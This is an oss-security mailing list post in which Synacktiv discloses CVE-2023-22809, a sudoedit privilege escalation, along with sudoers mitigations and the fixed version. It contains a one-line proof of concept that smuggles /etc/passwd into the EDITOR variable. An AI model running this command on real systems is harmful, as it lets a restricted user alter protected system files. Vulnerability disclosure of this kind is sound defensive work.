Received: (qmail 26048 invoked by uid 550); 19 Jan 2023 07:30:22 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 10208 invoked from network); 19 Jan 2023 00:34:37 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=synacktiv.com; s=google;
        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=FpArvq/h/LVtbmj0FYhevHqcS0z8/1j4Fc1Pceb0/xA=;
        b=c4r0TdReFX1/ZjQiN6hao/aSiMUWfS9efqRWGHZCFOHr15uQrHiXkMIN6Lih5oZK0g
         JTzkQU2jDzCs5haJuJHa5jAOL7ZDQYhA00zNQNel20JRJOpiA3r3fJ9psZqehVFheeEW
         F3xCguGcnX6LLwtkpA+wY/KFFvsxDCrbYcHHM=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=FpArvq/h/LVtbmj0FYhevHqcS0z8/1j4Fc1Pceb0/xA=;
        b=le124gcjXWQ07YU8DQuHvFSrHL7lPmUMwIurZVKbN4BE8Y+aA0KQk4C5l+tnEMDQwk
         8fbAf3cNcOKyvXcJSqmR9N1gv3HCpVK9niZRyDsHQ+Tpn6+qsEufxYQwAKEx4CHexIji
         ZpBJWDy4XF2E3aaTbcGDFww9lVJFk7p7ZGfk6gHdyskubfpHzFA9BXr5AyjdRJ1pQMtl
         lJvLdQJS8ILpkqSYCOz7JCT8WGuWjn8Bk4+gXbssilwP7JlZsoQG/Y0puIHI0wfFIaaN
         ed8mLL9M7+7zaVuoJLNhvf2HYoXKd6Qks3X2XIdkMBaQOOsfX22bgc6TeF+tSessWkyX
         Pr6Q==
X-Gm-Message-State: AFqh2koFRfjoAIj9Hq4y0FoA+JTafZhNpvooSiH0iI6eqU17rso9XNkm
	HoNP10KH9Iz70Mszs9qsSb12E1Bmj3blby1Q2EpFuIdebUKuWBtVDkg=
X-Google-Smtp-Source: AMrXdXvxNeUDID7YvVxvhNG1rGh62tN0J/fvHIvgISN9UYc3uGLyEuno8wnCv33c7zUI8WuGVX9287hWvt+yorunqKA=
X-Received: by 2002:a25:d753:0:b0:76a:e558:48ec with SMTP id
 o80-20020a25d753000000b0076ae55848ecmr960692ybg.384.1674088464976; Wed, 18
 Jan 2023 16:34:24 -0800 (PST)
MIME-Version: 1.0
From: Matthieu Barjole <matthieu.barjole@synacktiv.com>
Date: Thu, 19 Jan 2023 01:33:43 +0100
Message-ID: <CAE-GootkXskaRKTmdPg1KsL3cm2oPq8DtL14MoupwX_CaVDeXw@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="00000000000047387205f293183a"
Subject: [oss-security] CVE-2023-22809: Sudoedit can edit arbitrary files

--00000000000047387205f293183a
Content-Type: text/plain; charset="UTF-8"

Hello everyone,

While auditing Sudo, Synacktiv identified a privilege escalation in sudoedit
when a user is authorized to use it by the sudoers policy. This
vulnerability
was assigned CVE-2023-22809 and affects Sudo versions 1.8.0 through 1.9.12p1
inclusive.

## Analysis

The technical analysis can be found in the following security advisory:
https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf

## Proof of Concept

Assuming the following sudoers policy:

```
# cat /etc/sudoers
user ALL=(ALL:ALL) sudoedit /etc/motd
[...]
```

Arbitrary files such as `/etc/passwd` may also be edited as such:

```
EDITOR='vim -- /etc/passwd' sudoedit /etc/motd
```

## Mitigation

It is possible to prevent a user-specified editor from being used by
sudoedit by
adding the following line to the sudoers file.

```
Defaults!sudoedit   env_delete+="SUDO_EDITOR VISUAL EDITOR"
```

To restrict the editor when editing specific files, a Cmnd_Alias can be
used,
for example:

```
Cmnd_Alias          EDIT_MOTD = sudoedit /etc/motd
Defaults!EDIT_MOTD  env_delete+="SUDO_EDITOR VISUAL EDITOR"
user                ALL = EDIT_MOTD
```

## Fix

The issue was fixed in Sudo 1.9.12.p2.

## References

[1]
https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf
[2] https://www.sudo.ws/security/advisories/sudoedit_any/
[3] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809

--00000000000047387205f293183a--
